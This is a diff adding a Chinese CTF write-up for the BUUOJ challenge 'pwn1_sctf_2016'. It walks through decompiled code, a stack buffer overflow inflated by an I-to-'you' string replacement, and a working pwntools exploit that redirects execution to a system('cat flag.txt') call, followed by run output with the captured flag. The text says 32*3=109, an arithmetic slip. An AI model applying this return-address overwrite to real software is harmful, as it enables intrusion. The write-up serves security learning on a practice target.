@@ -458,7 +458,6 @@ timeout: the monitored command dumped core
 
 ```python
 from pwn import *
-import struct
 
 host = "node5.buuoj.cn"
 port = 26748
@@ -469,4 +468,139 @@ payload = b'q'*56 + p64(0x4006BE)
 print(sh.recvuntil("Let's guess the number."))
 sh.sendline(payload)
 sh.interactive()
+```
+
+## pwn1_sctf_2016
+
+```
+[*] '/home/wuko233/Projects/pwn/pwn1_sctf_2016/pwn1_sctf_2016'
+    Arch:       i386-32-little
+    RELRO:      Partial RELRO
+    Stack:      No canary found
+    NX:         NX enabled
+    PIE:        No PIE (0x8048000)
+    Stripped:   No
+```
+
+32位
+
+`main`
+
+```cpp
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  vuln();
+  return 0;
+}
+```
+
+`vuln`
+
+```cpp
+int vuln()
+{
+  const char *v0; // eax
+  char s[32]; // [esp+1Ch] [ebp-3Ch] BYREF
+  char v3[4]; // [esp+3Ch] [ebp-1Ch] BYREF
+  char v4[7]; // [esp+40h] [ebp-18h] BYREF
+  char v5; // [esp+47h] [ebp-11h] BYREF
+  char v6[7]; // [esp+48h] [ebp-10h] BYREF
+  char v7[5]; // [esp+4Fh] [ebp-9h] BYREF
+
+  printf("Tell me something about yourself: ");
+  fgets(s, 32, edata);
+  std::string::operator=(&input, s);
+  std::allocator<char>::allocator(&v5);
+  std::string::string(v4, "you", &v5);
+  std::allocator<char>::allocator(v7);
+  std::string::string(v6, "I", v7);
+  replace((std::string *)v3);
+  std::string::operator=(&input, v3, v6, v4);
+  std::string::~string(v3);
+  std::string::~string(v6);
+  std::allocator<char>::~allocator(v7);
+  std::string::~string(v4);
+  std::allocator<char>::~allocator(&v5);
+  v0 = (const char *)std::string::c_str((std::string *)&input);
+  strcpy(s, v0);
+  return printf("So, %s\n", s);
+}
+```
+
+(cpp反编译真难看。。)
+
+注意到其中定义v4、v6分别为`you`、`I`，同时在`replace`函数中被调用（v3），所以猜测应该是替换`input`内容中的`I`为`you`。
+
+`fgets()`内容缓冲区长度为32；`s`位于3C（esp+1Ch ebp-3Ch），也就是3*16+12=60字节长度；32位程序（Arch:i386-32-little），所以返回地址长度是4；
+
+需要通过溢出fgets()来覆盖s和返回地址，但是fgets()缓冲区只有32，我们却需要60+4=64，该怎么办呢？
+
+这时就可以利用`replace()`了！一个`I`1长度换3长度的`you`，我们最多就可以得到32*3=109的长度了！但我们只需要64长度，64/3=21余1:。
+
+所以先构建payload的一部分：
+
+```python
+payload = b'I' * 21 + b'q'
+```
+
+这样就实现了覆盖s与返回地址了，接下来就差shellcode了：
+
+`get_flag`
+
+```cpp
+int get_flag()
+{
+  return system("cat flag.txt");
+}
+```
+
+```asm
+.text:08048F0D ; int get_flag()
+.text:08048F0D                 public get_flag
+.text:08048F0D get_flag        proc near
+.text:08048F0D ; __unwind {
+.text:08048F0D                 push    ebp
+.text:08048F0E                 mov     ebp, esp
+.text:08048F10                 sub     esp, 18h
+.text:08048F13                 mov     dword ptr [esp], offset command ; "cat flag.txt"
+.text:08048F1A                 call    _system
+.text:08048F1F                 leave
+.text:08048F20                 retn
+.text:08048F20 ; } // starts at 8048F0D
+.text:08048F20 get_flag        endp
+```
+
+注意到shellcode地址为`8048F13`，所以构建后半部分shellcode:
+
+```python
+payload += p32(0x8048F13)
+```
+
+得到最终脚本：
+
+```python
+from pwn import *
+
+host = "node5.buuoj.cn"
+port = 29992
+
+sh = remote(host, port)
+
+payload = b'I' * 21 + b'q'
+payload += p32(0x8048F13)
+sh.sendline(payload)
+sh.interactive()
+```
+
+拿下！
+
+```bash
+PS D:\B23\VSC\H5\koishi.521514.xyz> & "D:/Program Files/python/python.exe" d:/CTF/项目/BUU/pwn/pwn1_sctf_2016/hack.py
+[x] Opening connection to node5.buuoj.cn on port 29992
+[x] Opening connection to node5.buuoj.cn on port 29992: Trying 117.21.200.176
+[+] Opening connection to node5.buuoj.cn on port 29992: Done
+[*] Switching to interactive mode
+flag{87ce8c15-cb0e-4149-8980-f5ca1a9e1573}
+timeout: the monitored command dumped core
+[*] Got EOF while reading in interactive
 ```
